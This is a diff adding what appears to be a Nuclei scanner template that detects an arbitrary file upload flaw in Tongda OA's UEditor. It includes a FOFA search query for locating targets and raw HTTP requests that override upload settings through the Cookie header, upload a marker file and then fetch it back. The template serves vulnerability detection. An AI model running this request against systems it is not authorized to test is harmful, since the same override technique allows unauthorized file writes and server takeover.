@@ -1,0 +1,39 @@
+id: tongda-oa-ueditor-file-upload
+
+info:
+  name: Tongda OA Ueditor File Upload
+  author: zp857
+  severity: critical
+  tags: tongda-oa,fileupload
+  metadata:
+    fofa-query: 'body="Anywhere 2017版" || body="/static/templates/2017_01/" || body="通达精灵2017版"'
+
+requests:
+  - raw:
+      - |
+        POST /module/ueditor/php/action_upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------123
+        Cookie: CONFIG[fileFieldName]=upfile;CONFIG[fileMaxSize]=51200;CONFIG[fileAllowFiles][]=.txt; CONFIG[filePathFormat]=/api/qianxin2
+        X_Requested_With: XMLHttpRequest
+
+        -----------------------123
+        Content-Disposition: form-data; name="upfile"; filename="qianxin2.txt"
+        Content-Type: application/octet-stream
+
+        qianxinnb
+        -----------------------123
+
+      - |
+        GET /api/qianxin2.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qianxinnb"
+
+      - type: status
+        status:
+          - 200
